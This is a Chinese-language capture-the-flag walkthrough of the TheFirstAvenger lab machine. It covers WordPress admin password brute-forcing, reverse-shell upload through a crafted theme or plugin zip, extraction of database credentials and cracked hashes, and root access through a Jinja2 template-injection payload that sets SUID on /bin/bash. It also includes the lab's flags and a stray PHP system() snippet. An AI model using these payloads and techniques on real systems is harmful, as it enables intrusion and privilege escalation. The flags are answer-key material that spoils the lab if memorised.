# TheFirstAvenger

2025.02.26 https://thehackerslabs.com/thefirstavenger/

[video](https://www.bilibili.com/video/BV1LCP7eGEFd/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 首页无内容，扫描出 http://192.168.5.39/wp1/ 是个 wordpress，先使用 wpscan 进行常规扫描，只发现了一个插件 stop-user-enumeration 1.6.3 这个插件阻止了 wpscan 进行枚举。

将域名 thefirstavenger.thl 添加到 hosts 文件中，发现页面中有用户名 admin 尝试爆破其登陆密码，找到 admin 的登陆密码：

```
Username: admin, Password: spongebob
```

登陆 wp 后台，在 Theme 编辑的地方上传一个 zip 文件包，里面包含 index.php 和 style.css 文件，其中 style.css 的文件开始内容要类似这样的格式，同时创建的 zip 压缩包的名字与 Theme Name 一样：

```
/*
Theme Name: demo
*/

zip demo.zip index.php style.css
```

然后 index.php 就是反弹 shell 的 php 脚本，在 Theme install 后，就可以访问这个页面得到反弹的 shell：

```
curl http://thefirstavenger.thl/wp1/wp-content/themes/demo/index.php
```

这里如果上传的是一个插件，需要将 php 反弹文件的名称改成 zip 的的名称，同时与下面的 Plugin Name 名字一样，两个名称要保持一致，并且在 php 的开始加入下面这样的注释模板,否则插件识别不了，安装时报错：

```
/*
Plugin Name: test
*/

zip test.zip test.php
```

```
curl http://thefirstavenger.thl/wp1/wp-content/plugins/test/test.php
```

得到反弹后，先查看 wp 的数据库配置文件：

```
www-data@TheHackersLabs-Thefirstavenger:/var/www/html/wp1$ cat wp-config.php

define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
define( 'DB_HOST', 'localhost' );
```

先进数据库看看有什么，发现另外一个库 top_secret 读取其内容：

```
mysql> select * from avengers;
+----+--------------+------------+----------------------------------+
| id | name         | username   | password                         |
+----+--------------+------------+----------------------------------+
|  1 | Iron Man     | ironman    | cc20f43c8c24dbc0b2539489b113277a |   -> tony123
|  2 | Thor         | thor       | 077b2e2a02ddb89d4d25dd3b37255939 |   -> thorhammer
|  3 | Hulk         | hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |   -> smash123
|  4 | Black Widow  | blackwidow | 022e549d06ec8ddecb5d510b048f131d |   -> natasha456
|  5 | Hawkeye      | hawkeye    | d74727c034739e29ad1242b643426bc3 |   -> hawkeye
|  6 | Steve Rogers | steve      | 723a44782520fcdfb57daa4eb2af4be5 |   -> thecaptain
+----+--------------+------------+----------------------------------+
```

同时发现系统上有一个用户也叫 steve ，尝试破解其哈希 723a44782520fcdfb57daa4eb2af4be5 得到明文密码: thecaptain

su 切换到 steve ，拿到 user flag:

```
steve@TheHackersLabs-Thefirstavenger:~$ cat user.txt
vbh579vExKtPF359H2TikzAWuzNhMVACYeyEsYW7
```

发现以 root 身份运行了 /opt/app/server.py 脚本，ss 发现本地监听了 127.0.0.1:7092 curl 一下看看有什么显示，发现可以提供一个 ip，然后对这个 ip 进行 ping 操作：

```
<input type="text" id="ip" name="ip" value="" required>
curl -G --data-urlencode 'ip=192.168.5.3' http://127.0.0.1:7092
```

这里应该可以执行命令，进行变形：

```
curl -G --data-urlencode 'ip=192.168.5.3;id' http://127.0.0.1:7092
```

执行报错，绕不过去，在看看有没有 SSTI (因为看到页面上有输入信息的回显信息，这种情况下可能有模板使用的情况)：

```
curl -G --data-urlencode "ip={{7*'7'}}" http://127.0.0.1:7092
```

这时回显的数据上 form 中的 ip 字段变成了 `<input type="text" id="ip" name="ip" value="127.0.0.7777777" required>` 证明存在 SSTI，可能是 Jinja2，进行利用：

```
curl -G --data-urlencode "ip={{ self.__init__.__globals__.__builtins__.__import__('os').popen('chmod +xs /bin/bash').read() }}" http://127.0.0.1:7092
```

这时直接将 /bin/bash 变成了 suid 程序。

```
steve@TheHackersLabs-Thefirstavenger:/tmp$ /bin/bash -p
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
LAZWSPcMckPMzNPtRrVHsDLjw754tT77t9MVuvda
```

最后在看一下 server.py 的实现源码，为什么命令执行那里不能注入，使用了 flask：

```
if not ip_address:
        return render_template_string(HTML_FORM)
    try:
        result = subprocess.check_output(['/usr/bin/ping', '-c', '1', ip_address], stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        result = f"Error al ejecutar: {e.output}"
    except Exception as e:
        result = f"Error inesperado: {str(e)}"
    return render_template_string(HTML_FORM, result=result, ip_address=ip_address)
```

subprocess.check_output 后面接的是参数，会当成一个整体，所以不能用;号分割。<?php system('whoami');?>

也可以用这个网站检测 SSTI https://cheatsheet.hackmanit.de/template-injection-table/ 按顺序输入各种 payload，然后根据返回结果，就可以进一步判断使用的是那种模板引擎。推荐测试：

```
{{1in[1]}}
```
